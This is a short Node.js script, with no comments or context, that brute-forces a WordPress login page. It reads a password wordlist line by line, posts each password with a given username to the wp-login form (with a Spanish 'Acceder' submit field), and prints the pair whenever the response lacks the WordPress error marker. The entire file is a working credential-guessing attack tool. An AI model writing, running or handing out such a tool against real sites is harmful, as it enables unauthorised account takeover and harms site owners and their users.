#!/bin/node

const fs = require('fs');
const http = require('http');
const querystring = require('querystring');

const url = process.argv[2];
const username = process.argv[3];
const listFilePath = process.argv[4];

function nextLine(text, prev) {
  let line = prev;
  let valid = false;
  let i = 0;
  for (; i < text.length; i++) {
    if (text[i] !== '\n') {
      line += text[i];
    } else {
      i++;
      valid = true;
      break;
    }
  }
  return {text: text.substring(i, text.length), line, valid};
}

function makeRequest(password) {
  if (password === '') {
    return;
  }
  const formData = querystring.stringify({
    log: username,
    pwd: password,
    'wp-submit': 'Acceder'
  });
  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': formData.length
    }
  };
  new Promise((resolve, reject) => {
    const req = http.request(url, options, (res) => {
      let responseData = '';
      res.on('data', (chunk) => {
        responseData += chunk;
      });
      res.on('end', () => {
        resolve(responseData);
      });
    });
    req.on('error', (error) => reject(error));
    req.write(formData);
    req.end();
  })
    .then(data => {
      if (!data.includes('<strong>ERROR</strong>')) {
        console.log('username: ' + username + 'password: ' + password);
      }
    })
    .catch(error => console.error(error));
}

const stream = fs.createReadStream(listFilePath);
const tries = new Promise((resolve) => {
  let extraText = '';
  stream.on('data', (chunk) => {

    chunk = chunk.toString();
    let {text, line, valid} = nextLine(chunk, extraText);
    chunk = text;
    while (valid) {
      extraText = '';
      makeRequest(line);

      let res = nextLine(chunk, extraText);
      line = res.line;
      valid = res.valid;
      chunk = res.text;
    }
    if (!valid) {
      extraText = line;
    } else {
      extraText = '';
    }
  });

  stream.on('close', (data) => {
    resolve();
  });
});

tries.then();
